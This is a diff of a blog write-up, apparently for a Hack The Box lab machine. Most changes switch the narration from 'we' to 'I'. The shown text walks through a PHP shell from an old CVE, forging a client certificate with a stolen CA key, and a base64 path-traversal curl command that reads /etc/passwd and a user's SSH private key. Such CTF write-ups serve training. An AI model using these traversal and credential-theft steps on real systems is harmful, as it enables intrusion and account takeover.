@@ -104,9 +104,9 @@ Due to the age of this CVE, reliable proof-of-concept exploits are easy to find 
 Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
 $
 ```
-The exploit works, however, we don't get a bash shell. Instead, we obtained a [Psy](https://psysh.org/) Shell which is an interpreter for PHP code, similar to python's interactive shell. This means we have to execute commands using php language.
+The exploit works, however, I don't get a bash shell. Instead, I obtained a [Psy](https://psysh.org/) Shell which is an interpreter for PHP code, similar to python's interactive shell. This means we have to execute commands using php language.
 
-We can try with the most common PHP calls to achieve command execution, such as system() or exec() however, these will fail.
+I can try with the most common PHP calls to achieve command execution, such as system() or exec() however, these will fail.
 
 ```bash
 Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
@@ -117,7 +117,7 @@ PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 
 $
 ```
 
-Something that can provide us with a lot of information is phpinfo(). This one works and it shows us why our calls were not working.
+Something that can provide me with a lot of information is phpinfo(). This one works and it shows us why our calls were not working.
 
 ```bash
 ...
@@ -127,7 +127,7 @@ display_startup_errors => Off => Off
 ...
 ```
 
-Every function that allows for RCE is disabled. However, this doesn't stop us from trying other commands. Following [this](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) post, we can see an extensive list of PHP functions useful for our case. For example, reading our current directory with scandir.
+Every function that allows for RCE is disabled. However, this doesn't stop us from trying other commands. Following [this](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) post, we have an extensive list of PHP functions useful for our case. For example, reading our current directory with scandir.
 
 ```bash
 $ scandir("./");
@@ -229,9 +229,9 @@ With this in mind, and knowing that access to port 443 requires a valid, signed 
 
 ### Shell as professor
 
-Following the strategy, we'll sign a cetificate for ourselves using the ca.key found. This will hopefully give us access to the page in 443.
+Following the strategy, I'll sign a cetificate for myself using the ca.key found. This will hopefully give me access to the page in 443.
 
-First, we have to look at the configuration of the certificate in the page. We'll click on the little lock at the top of the page and click on `connection not secure`.
+First, I have to look at the configuration of the certificate in the page. I'll click on the little lock at the top of the page and click on `connection not secure`.
 
 <p align="center">
   <a href="/assets/images/lacasadepapel/Captura5.PNG" class="glightbox">
@@ -255,7 +255,7 @@ And now on `view certificate`.
   </a>
 </p>
 
-The information we want is over here.
+The information I want is over here.
 
 <p align="center">
   <a href="/assets/images/lacasadepapel/Captura8.PNG" class="glightbox">
@@ -265,7 +265,7 @@ The information we want is over here.
 
 Following this [post](https://arminreiter.com/2022/01/create-your-own-certificate-authority-ca-using-openssl/), we can get an idea on how to create our own self-signed certificate with the newly obtained ca.key. 
 
-In the referenced post, the process is divided into multiple steps using OpenSSL. The first step involves creating a private key to sign the certificate. In our case, this step can be skipped, as we already have access to the required key. Moving on to the second step, we can proceed with signing the certificate.
+In the referenced post, the process is divided into multiple steps using OpenSSL. The first step involves creating a private key to sign the certificate. In this case, this step can be skipped, as we already have access to the required key. Moving on to the second step, we can proceed with signing the certificate.
 
 ```bash
 ┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
@@ -301,7 +301,7 @@ With OpenSSL is pretty easy, we just need to read the [man](https://docs.openssl
 Enter Export Password:
 Verifying - Enter Export Password:
 ```
-Now that we have generated a PKCS#12 certificate, the next step is to import it into Firefox so we can actually use it for authentication. Before doing so, we should temporarily disable Burp Suite, as it already injects its own PortSwigger CA certificate, which would interfere with the client certificate we want to present.
+Now that I have generated a PKCS#12 certificate, the next step is to import it into Firefox so I can actually use it for authentication. Before doing so, we should temporarily disable Burp Suite, as it already injects its own PortSwigger CA certificate, which would interfere with the client certificate we want to present.
 
 First, we'll go to `Settings` in Firefox.
 
@@ -341,7 +341,7 @@ It should now appear in the tab.
   </a>
 </p>
 
-Now, reloading the webpage, we should get a request for our valid certificate. Clicking "Ok" should now give us access to the page.
+Now, reloading the webpage, I get a request for the valid certificate. Clicking "Ok" should now give us access to the page.
 
 <p align="center">
   <a href="/assets/images/lacasadepapel/Captura16.PNG" class="glightbox">
@@ -357,7 +357,7 @@ We are presented with a "`Private Area`", featuring two sections "Season 1" and 
   </a>
 </p>
 
-First, we have in the URL a variable named path, which always asked to be tested for LFI. Also, in the bottom of the page, we can see the name of the file. We can "Open Link in New Tab" to take a better look at it.
+First, we have in the URL a variable named path, which always asks to be tested for LFI. Also, in the bottom of the page, we can see the name of the file. I'll click "Open Link in New Tab" to take a better look at it.
 
 <p align="center">
   <a href="/assets/images/lacasadepapel/Captura19.PNG" class="glightbox">
@@ -372,7 +372,7 @@ It is a base64 encoded string.
 └─$ echo 'U0VBU09OLTEvMDEuYXZp' | base64 -d
 SEASON-1/01.avi
 ```
-My first test will be the path varibale. We can try accessing the previous directory.
+My first test will be the path varibale. I can try accessing the previous directory.
 
 <p align="center">
   <a href="/assets/images/lacasadepapel/Captura20.PNG" class="glightbox">
@@ -380,7 +380,7 @@ My first test will be the path varibale. We can try accessing the previous direc
   </a>
 </p>
 
-It looks like the home directory of someone. With this approach we can't access files directly but rather directories, so we'll try base64 encoding it and using the /files path where the webpage was accessing the .avi files. To make this more agile, I'll use curl from my terminal.
+It looks like the home directory of someone. With this approach we can't access files directly but rather directories, so I'll try base64 encoding it and using the /files path where the webpage was accessing the .avi files. To make this more agile, I'll use curl from my terminal. The first test is a success, I can read /etc/passwd.
 
 ```bash
 ┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
@@ -420,3 +420,31 @@ professor:x:1002:1002:professor,,,:/home/professor:/bin/ash
 vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin
 memcached:x:102:102:memcached:/home/memcached:/sbin/nologin
 ```
+I'll try to read into the directory I accessed before and extract the id_rsa key.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
+└─$ curl -k https://lacasadepapel.htb/file/$(echo -n "../.ssh/id_rsa" | base64)
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcnNh
+otH6Ygupi7JhjdbDXhg2f9xmzxaDNdxxEioAgH2GjUeUc4cJeTfU/yWg1vyx1dXqanfwAzYO
+...
+ram9k+oABmLisVVgkKvfbzWRmGMDfG2X0jOrIw52TZn9MwTcr+oMyi1RTG7oabPl6cNM0x
+X3a0iF5JE3kAAAAYYmVybGluQGxhY2FzYWRlcGFwZWwuaHRiAQID
+-----END OPENSSH PRIVATE KEY-----
+```
+
+I can just simply copy and paste into a file, and change it's permissions to be able to use it.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
+└─$ mousepad id_rsa       
+                                                                                                                    
+┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
+└─$ file id_rsa 
+id_rsa: OpenSSH private key
+                                                                                                                    
+┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
+└─$ chmod 600 id_rsa 
+```
+
